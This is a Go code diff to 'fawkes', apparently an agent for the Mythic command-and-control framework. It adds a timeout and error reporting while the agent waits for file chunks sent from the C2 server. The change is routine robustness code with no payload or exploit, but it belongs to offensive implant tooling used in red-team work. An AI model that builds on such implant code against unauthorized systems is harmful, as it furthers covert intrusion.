@@ -5,7 +5,11 @@ import (
 	"encoding/json"
 	"fawkes/pkg/structs"
 	"fmt"
+	"time"
 )
+
+// fileTransferTimeout is the maximum time to wait for a single file chunk response
+const fileTransferTimeout = 5 * time.Minute
 
 var GetFromMythicChannel = make(chan structs.GetFileFromMythicStruct, 10)
 
@@ -16,6 +20,17 @@ func listenForGetFromMythicMessages() {
 		getFile.FileTransferResponse = make(chan json.RawMessage)
 		getFile.Task.Job.SetFileTransfer(getFile.TrackingUUID, getFile.FileTransferResponse)
 		go sendUploadFileMessagesToMythic(getFile)
+	}
+}
+
+// waitForFileResponse waits for a response on the file transfer channel with a timeout.
+// Returns nil if the timeout expires.
+func waitForFileResponse(ch chan json.RawMessage, timeout time.Duration) (json.RawMessage, bool) {
+	select {
+	case data := <-ch:
+		return data, true
+	case <-time.After(timeout):
+		return nil, false
 	}
 }
 
@@ -35,8 +50,17 @@ func sendUploadFileMessagesToMythic(getFileFromMythic structs.GetFileFromMythicS
 	// Send the request via the SendResponses channel
 	getFileFromMythic.Task.Job.SendResponses <- fileUploadMsg
 
-	// Wait for the response
-	rawData := <-getFileFromMythic.FileTransferResponse
+	// Wait for the response with timeout
+	rawData, ok := waitForFileResponse(getFileFromMythic.FileTransferResponse, fileTransferTimeout)
+	if !ok {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = getFileFromMythic.Task.ID
+		errResponse.UserOutput = "File transfer timed out waiting for response from Mythic"
+		getFileFromMythic.Task.Job.SendResponses <- errResponse
+		getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
+		return
+	}
 
 	fileUploadMsgResponse := structs.FileUploadMessageResponse{}
 	err := json.Unmarshal(rawData, &fileUploadMsgResponse)
@@ -85,8 +109,18 @@ func sendUploadFileMessagesToMythic(getFileFromMythic structs.GetFileFromMythicS
 			fileUploadMsg.Upload.ChunkNum = index
 			getFileFromMythic.Task.Job.SendResponses <- fileUploadMsg
 
-			// Get the response
-			rawData := <-getFileFromMythic.FileTransferResponse
+			// Get the response with timeout
+			rawData, ok := waitForFileResponse(getFileFromMythic.FileTransferResponse, fileTransferTimeout)
+			if !ok {
+				errResponse := structs.Response{}
+				errResponse.Completed = true
+				errResponse.TaskID = getFileFromMythic.Task.ID
+				errResponse.UserOutput = fmt.Sprintf("File transfer timed out waiting for chunk %d/%d from Mythic", index, fileUploadMsgResponse.TotalChunks)
+				getFileFromMythic.Task.Job.SendResponses <- errResponse
+				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
+				return
+			}
+
 			fileUploadMsgResponse = structs.FileUploadMessageResponse{}
 			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
 			if err != nil {
